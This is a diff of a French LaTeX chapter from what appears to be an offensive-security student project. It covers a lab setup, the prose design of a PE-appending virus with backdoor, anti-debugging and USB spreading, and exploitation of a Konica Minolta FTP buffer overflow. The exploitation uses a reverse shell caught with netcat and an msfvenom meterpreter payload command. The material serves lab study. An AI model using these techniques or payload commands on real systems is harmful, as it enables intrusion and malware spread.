@@ -1,9 +1,159 @@
 %!TEX root = ../main.tex
 
+\newpage
+
 \section{Préparation de l'environnement}
+Dans cette section, l'environnement et les outils nécessaire pour le bon fonctionnement du projet seront installer
+et préparé correctement. Il y en a en gros trois machines différentes : une machine d'attaque, une machine vulnérable,
+et finalement une machine sécurisé.
+
+    \subsubsection{La machine d'attaque} 
+    Cette machine sera équiper du système d'exploitation \emph{Kali Linux \cite{linux} Rolling} (figure ), le 
+    leader des systèmes de testes d'intrusions. Après le téléchargement de l'image
+    ISO depuis le site officiel de Kali, et l'installation de l'image sur
+    une machine virtuelle, une mise à jours complète du système est faite par le biais de cette commande : 
+    ``\texttt{sudo apt-get update \&\& sudo apt-get upgrade}'' (Pour une explication des commandes utilisées,
+    consultez \autoref{commandes}).
+        \begin{center}
+            photo de kali linux avec la commande ``sudo apt-get update \&\& sudo apt-get upgrade''
+        \end{center}
+
+    \subsubsection{La machine vulnérable} \label{machine_vulnerable} 
+    Cette machine sera équiper d'une version \emph{Windows 7}  
+    doté d'un service vulnérable et d'un pare-feu désactiver. Le service vulnérable installé sur cette 
+    machine est un service \emph{ftp} manipulé par le programme \emph{KONICA MINOLTA FTP Utility} 
+    (\autoref{la_machine_vulnerable}).
+    \begin{figure}[h!]
+        \centering
+        \includegraphics[scale=0.3]{images/Windows_7_2.png}
+        \caption{La machine vulnérable}
+        \label{la_machine_vulnerable}
+    \end{figure}
+
+    \subsubsection{La machine sécurisé} 
+    Cette machine sera équiper de \emph{Windows 7} avec un anti virus et un pare-feu fonctionnel.
+
+\subsection{Réseau}
+    Les trois machines seront dans le réseau \cite{reseau} dont l'adresse est \emph{172.16.178.0/24}. 
+    La machine d'attaque aura l'adresse IP \emph{172.16.178.1} ; la machine vulnérable aura l'adresse IP 
+    \emph{172.16.178.129} ; et finalement, la machine sécurisé aura l'adresse IP \emph{172.16.172.130}.
+
+    Pour voir comment le réseau a été configuré sur chaque machine, consultez \autoref{config_reseau}.
+
 
 \section{Développement}
+    \subsection{Backdoor}
+    \subsection{Virus infecteur}
+    La méthode d’infection que nous allons utiliser est : l’injection de code dans un exécutable par \emph{Ajout}
+    dont une définition claire a été abordée dans le chapitre précédent.
 
-\section{Exploitation et infection}
+    Cette technique, se base sur la manipulation de la structure PE (une définition détaillée a été donnée dans le 
+    \autoref{pe_header}), nous avons donc inclus la bibliothèque \emph{Windows.h} qui contient les 
+    structures et fonctions nécessaires.
 
-\section{Démonstration de la propagation}
+    Le code se divise en deux fonctions primordiales :
+    \begin{description}
+        \item[WinMain :] Cette fonction est la fonction Main, dans un premier temps son rôle est de créer 
+        deux espaces mémoire pour y stocker le code du Virus et du Backdoor, puis de cibler un exécutable. 
+        une vérification sera faite sur sa compatibilité avec Windows 32 bits.
+
+        Dans un deuxième temps, elle ouvre ce dernier et récupère sa structure PE. Après des calculs précis, 
+        elle stocke dans une variable le Point d’Entrer Original appelé \emph{OEP} et ajoute à la fin de ce 
+        fichier deux nouveaux segments; le segment qui contient le code du Virus et un autre qui contient 
+        le code du Backdoor puis les crypte avec une clé prédéfinie. A la fin, elle 
+        change le point d’entrer et le fait pointer vers la fonction VirusCode (\autoref{changement_point_entree}).
+        La fonction modifie aussi le \emph{loader flags}\footnote{\emph{loader flags} est un flag obsolète non
+        utiliser par Windows.} et y place notre flag d'infection. En dernier, une correction du \emph{Checksum}
+        sera faite.
+        
+        \item[VirusCode :] Cette fonction sera le nouveau point d’enter de chaque exécutable infecté, 
+            elle s’exécutera toujours en premier puis elle donnera la main au code original, 
+            elle passe par trois étapes clé : \\
+            Premièrement, une récupération de l'adresse de la bibliothèque Kernel32 chargé avec l'exécutable 
+            hôte est primordiale pour trouver et stocker les adresses des fonctions  nécessaires au bon 
+            fonctionnement du code malveillant.
+            deuxièmement, elle chargera l’adresse du segment du Virus et du Backdoor, créera deux 
+            emplacements mémoire et les copie dedans, puis elle les décrypte.
+            Et enfin, elle créera deux fichiers exécutables dans le dossier “temp”, un contenant le Virus et 
+            l’autre le Backdoor, et les exécutera. En dernier, un appel vers le point d’entrer original sera fait.
+
+    \end{description}
+
+    \begin{figure}[h]
+        \centering
+        \includegraphics[width=\linewidth]{images/pe_changes.png}
+        \caption{Changement du point d'entré}
+        \label{changement_point_entree}
+    \end{figure}
+
+    Nous citerons aussi que ce Virus infecte les fichiers exécutables des clés USB connecté à la machine.
+    La particularité majeure de notre Virus est qu’il utilise des API native, et qu’il ne peut pas être 
+    déboguer, une démonstration est montrer dans la figure suivante:
+
+\section{Exploitation}
+Cette section sera consacré à l'exploitation de la machine vulnérable, et l'obtention d'un accès à distance
+sur cette dernière.
+    \subsection{La vulnérabilité}
+    Le service vulnérable qui a été installé est un service \emph{ftp} manipulé par le programme 
+    \emph{Konica Minolta FTP Utility}. 
+    La vulnérabilité découverte, qui est un débordement de tampon (\autoref{buffer_overflow}), a été publié le 11
+    Janvier 2016 sur le site d'\emph{Exploit Database}\footnote{\emph{Exploit Database} est un site qui se charge
+    d'archiver les exploits publics et les logiciels vulnérables correspondants. Ce site dont le lien est 
+    \url{www.exploit-db.com} est développé par les testeurs d'intrusions et les chercheurs de vulnérabilités.}.
+
+    La version vulnérable du programme peut être obtenu depuis ce lien 
+    \url{https://www.exploit-db.com/apps/6388a2ae7dd2965225b3c8fad62f2b3b-ftpu_10.zip}.
+
+    \subsection{L'exploit}
+    Le script qui permet d'exploiter cette vulnérabilité peut être récupérer depuis ce lien 
+    \url{https://www.exploit-db.com/exploits/39215/}.
+    Ce script \emph{python} se divise en deux parties :
+    \begin{description}
+        \item[Exploit :] Cette partie du script permet en quelque sorte de préparer le programme vulnérable à 
+            recevoir le code malveillant pour l'exécution. Cette partie n'est pas à modifier, car elle a été développé
+            après une étude approfondie du programme vulnérable.
+
+        \item[Charge :] Cette partie du script représente le code qui sera exécuté sur l'application vulnérable.
+            % L'exploit téléchargé depuis ce lien \url{https://www.exploit-db.com/exploits/39215/} vient avec une charge
+            % par défaut, qui est un \emph{reverse shell}.% Pour notre démonstration, on ne va pas utiliser 
+            % la charge par défaut, mais on va plutôt utiliser une autre charge qui permet d'exécuter un programme 
+            % beaucoup plus puissant, qui est \emph{meterpreter}. 
+    \end{description}
+
+    Le script va se connecter à la machine victime sur port 21 (\autoref{execution_script_exploitation}). 
+    La charge qu'utilise le 
+    script va ordonné à la machine qu'elle donne un reverse shell en se reconnectant à la machine de l'attaquant 
+    à l'adresse 192.168.0.118 sur le port 4444. Pour intercepter ce reverse shell, et pouvoir communiquer avec
+    la machine victime, il faut ordonner à netcat\footnote{} d'écouter sur le port 4444 avec la commande ``\texttt{netcat -nlvp 4444}''.
+
+    \begin{figure}[h!]
+        \centering
+        \begin{subfigure}{0.9\textwidth}
+            \centering
+            \includegraphics[width=\textwidth]{images/exploit_python.png}
+            \caption{Exécution du script d'exploitation}
+            \label{execution_script_exploitation}
+        \end{subfigure}
+        \hfill
+        \begin{subfigure}{0.9\textwidth}
+            \centering
+            \includegraphics[width=\textwidth]{images/reverse_shell.png}
+            \caption{Obtention du reverse shell}
+            \label{obtention_reverse_shell}
+        \end{subfigure}
+        \hfill
+        \caption{Exploitation avec la charge d'origine}
+        \label{exploitation_avec_charge_origine}
+    \end{figure}
+
+
+    La charge utilisé par le script est un petit peu faible. Donc, nous allons générer une charge beaucoup plus
+    puissante, et qui donnera un accès plus complet sur la machine victime. Pour pouvoir générer cette charge nous
+    allons faire recours aux services de \emph{msfvenom}, qui est l'un des nombreux sous-programmes de Métasploit.
+    La commande qui nous permettra de générer la charge de meterpreter est 
+    % \verbatim{msfvenom -a x86 --platform windows -p windows/meterpreter/reverse\_tcp LHOST\=172.16.178.1 LPORT\=4444 -e x86/shikata\_ga\_nai -b ``x00x0dxx2f'' -i 3 -f python}
+
+    \subsection{Obtention d'accès}
+\section{Teste de propagation}
+
+\section{Conclusion}
